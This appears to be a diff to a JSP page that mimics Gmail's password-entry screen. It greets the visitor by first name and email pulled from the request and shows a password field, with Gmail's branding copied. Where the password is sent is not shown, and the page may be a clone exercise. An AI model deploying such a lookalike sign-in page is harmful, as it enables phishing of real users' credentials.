@@ -1,3 +1,6 @@
+<%@ page language="java" contentType="text/html; charset=UTF-8"
+    pageEncoding="UTF-8"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html>
 <head>
 	<script>
@@ -28,9 +31,13 @@ Gmail
 
 
 <div class="div1">
-
-<h1 class="headerclass">Enter password </h1>
-<h1 class="subheading"> to continue to Gmail</h1>
+<%
+HttpSession ss = request.getSession();
+String var = (String)request.getAttribute("email");
+String firstname = (String)request.getAttribute("firstname");
+%>
+<h1 class="headerclass">Hi <%out.print(firstname);%> </h1>
+<h1 class="subheading"><%out.print(var);%></h1>
 <input id="identifier" class="username" type="password" name="password" placeholder="Enter your password">
 <hr class="line">
 <p id="demo" style="position:absolute; left:460px;top:305px; color:red; font-size:15px; font-family:FreeSans"></p>
@@ -40,10 +47,7 @@ Gmail
 <font style="position:absolute; top:610px; left:423px ;width:200px; font-size:12px; font-family:FreeSans">English (United States)</font>
 <font style="position:absolute; top:610px; left:710px ;width:250px; font-size:13px; font-family:FreeSans; color:grey" >Help &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Privacy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Terms</font>
 </div>
-<%
 
-
-%>
 </form>
 </body>
 <style>
